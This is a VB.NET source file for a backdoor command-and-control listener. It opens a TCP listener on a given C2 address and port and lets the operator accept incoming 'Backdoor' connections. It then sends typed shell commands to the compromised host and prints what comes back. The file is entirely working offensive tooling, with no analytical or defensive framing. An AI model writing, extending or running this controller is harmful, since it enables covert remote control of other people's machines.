﻿Imports System.IO
Imports System.Net
Imports System.Net.Sockets
Imports System.Text
Imports System.Threading

Module Module1
    Sub Main()
        Console.Clear()

        If Environment.GetCommandLineArgs().Length <> 3 Then
            Console.WriteLine("Usage: <C2-IP> <C2-PORT>")
            Environment.Exit(1)
        End If

        Dim lhost As String = Environment.GetCommandLineArgs()(1)
        Dim lport As Integer = Convert.ToInt32(Environment.GetCommandLineArgs()(2))

        Try
            Dim listener As New TcpListener(IPAddress.Parse(lhost), lport)
            listener.Start()
            Console.WriteLine($"[+] TCP listener active @ {lhost}:{lport}...")

            While True
                Dim client As TcpClient = listener.AcceptTcpClient()
                Dim clientEndPoint As IPEndPoint = CType(client.Client.RemoteEndPoint, IPEndPoint)

                Console.Write($"[!] Backdoor @ {clientEndPoint.Address}:{clientEndPoint.Port} wants to connect! Allow? (Y/n): ")
                Dim choice As String = Console.ReadLine()

                If choice.ToLower() = "y" Then
                    Console.Clear()

                    Dim welcomeMessage As Byte() = Encoding.UTF8.GetBytes("Hello and Welcome")
                    client.GetStream().Write(welcomeMessage, 0, welcomeMessage.Length)

                    ' Set a timeout for receiving data
                    client.ReceiveTimeout = 5000  ' Set timeout to 5 seconds

                    While True
                        Try
                            Console.Write("> ")
                            Dim command As String = Console.ReadLine()

                            If command.ToLower() = "goodbye" Then
                                client.Close()
                                Exit While
                            Else
                                Dim cmdBytes As Byte() = Encoding.UTF8.GetBytes(command)
                                client.GetStream().Write(cmdBytes, 0, cmdBytes.Length)

                                Dim results As New StringBuilder()
                                While True
                                    Try
                                        Dim buffer(1023) As Byte
                                        Dim bytesRead As Integer = client.GetStream().Read(buffer, 0, buffer.Length)
                                        results.Append(Encoding.UTF8.GetString(buffer, 0, bytesRead))

                                        If bytesRead < buffer.Length Then
                                            Exit While ' End of transmission
                                        End If
                                    Catch ex As IOException
                                        Exit While ' Exit the inner while loop if a timeout occurs
                                    End Try
                                End While

                                Console.WriteLine($"{vbCrLf}{results.ToString()}")
                            End If
                        Catch ex As SocketException
                            Console.WriteLine("Transmission error!")
                        End Try
                    End While
                Else
                    ' Reject connection
                    Dim goodbyeMessage As Byte() = Encoding.UTF8.GetBytes("goodbye")
                    client.GetStream().Write(goodbyeMessage, 0, goodbyeMessage.Length)
                    client.Close()
                End If
            End While

        Catch ex As ThreadAbortException
            Environment.Exit(0)
        Catch ex As Exception
            Console.WriteLine(ex.Message)
        End Try
    End Sub
End Module
